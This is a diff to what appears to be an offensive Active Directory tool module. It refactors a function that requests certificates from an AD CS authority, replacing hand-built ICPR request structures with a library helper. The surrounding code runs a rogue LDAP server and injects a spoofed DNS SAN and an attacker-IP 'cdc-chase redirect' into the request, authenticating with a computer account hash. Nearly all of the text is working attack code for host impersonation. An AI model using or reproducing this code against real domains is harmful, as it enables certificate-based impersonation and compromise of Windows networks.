@@ -21,13 +21,11 @@ from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption,
 from cryptography.x509.oid import NameOID
 from impacket import ntlm, smbserver, uuid
 from impacket.dcerpc.v5 import epm, lsad, nrpc, transport
-from impacket.dcerpc.v5.dtypes import DWORD, LPWSTR, NULL, PBYTE, RPC_SID, SID, ULONG
-from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
-from impacket.dcerpc.v5.nrpc import checkNullString
+from impacket.dcerpc.v5.dtypes import NULL, RPC_SID, SID
+from impacket.dcerpc.v5.icpr import MSRPC_UUID_ICPR, hCertServerRequest
 from impacket.dcerpc.v5.rpcrt import DCERPCServer, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_NETLOGON
 from impacket.ldap.ldap import LDAPSessionError
 from impacket.ldap.ldapasn1 import Scope
-from impacket.uuid import uuidtup_to_bin
 
 from nxc.helpers.misc import CATEGORY, gen_random_string
 from nxc.logger import nxc_logger
@@ -640,25 +638,6 @@ class RogueLDAP:
             threading.Thread(target=self.handle_client, args=(conn,), daemon=True).start()
 
 
-MSRPC_UUID_ICPR = uuidtup_to_bin(("91ae6020-9e3c-11cf-8d7c-00aa00c091be", "0.0"))  # ICertRequestD
-
-
-class CERTTRANSBLOB(NDRSTRUCT):
-    structure = (("cb", ULONG), ("pb", PBYTE))
-
-
-class CertServerRequest(NDRCALL):
-    opnum = 0
-    structure = (("dwFlags", DWORD), ("pwszAuthority", LPWSTR), ("pdwRequestId", DWORD),
-                 ("pctbAttribs", CERTTRANSBLOB), ("pctbRequest", CERTTRANSBLOB))
-
-
-class CertServerRequestResponse(NDRCALL):
-    structure = (("pdwRequestId", DWORD), ("pdwDisposition", ULONG),
-                 ("pctbCert", CERTTRANSBLOB), ("pctbEncodedCert", CERTTRANSBLOB),
-                 ("pctbDispositionMessage", CERTTRANSBLOB))
-
-
 def connect_icpr(binding, ca_ip, domain, comp_name, comp_hash, dc_ip):
     rpctransport = transport.DCERPCTransportFactory(binding)
     rpctransport.setRemoteHost(ca_ip)
@@ -682,19 +661,6 @@ def request_certificate(ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
     csr_der = csr.public_bytes(Encoding.DER)
     attrs = [f"CertificateTemplate:{template}", f"SAN:dns={hostname}",
              f"cdc:{attacker_ip}", f"rmd:{rmd_value}"]  # cdc-chase redirect + impersonated DNS
-    attr_bytes = checkNullString("\n".join(attrs)).encode("utf-16le")
-    pctb_attribs = CERTTRANSBLOB()
-    pctb_attribs["cb"] = len(attr_bytes)
-    pctb_attribs["pb"] = attr_bytes
-    pctb_request = CERTTRANSBLOB()
-    pctb_request["cb"] = len(csr_der)
-    pctb_request["pb"] = csr_der
-    req = CertServerRequest()
-    req["dwFlags"] = 0
-    req["pwszAuthority"] = checkNullString(ca_name)
-    req["pdwRequestId"] = 0
-    req["pctbAttribs"] = pctb_attribs
-    req["pctbRequest"] = pctb_request
 
     try:
         binding = f"ncacn_np:{ca_ip}[\\pipe\\cert]"
@@ -704,12 +670,10 @@ def request_certificate(ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
         binding = epm.hept_map(ca_ip, MSRPC_UUID_ICPR, protocol="ncacn_ip_tcp")
         dce = connect_icpr(binding, ca_ip, domain, comp_name, comp_hash, dc_ip)
 
-    resp = dce.request(req, checkError=False)
-    disp = resp["pdwDisposition"]
-    if disp != 3:  # CR_DISP_ISSUED
-        msg = b"".join(resp["pctbDispositionMessage"]["pb"]).decode("utf-16le", errors="replace")
-        raise RuntimeError(f"Cert request denied (0x{disp & 0xFFFFFFFF:08x}): {msg}")
-    cert_der = b"".join(resp["pctbEncodedCert"]["pb"])
+    # hCertServerRequest returns the issued cert (DER) or empty bytes if the CA denied it
+    cert_der = hCertServerRequest(dce, csr_der, attrs, ca=ca_name)
+    if not cert_der:
+        raise RuntimeError("Cert request denied by the CA")
     cert = x509.load_der_x509_certificate(cert_der)
     return pkcs12.serialize_key_and_certificates(b"", key, cert, None, NoEncryption())
 
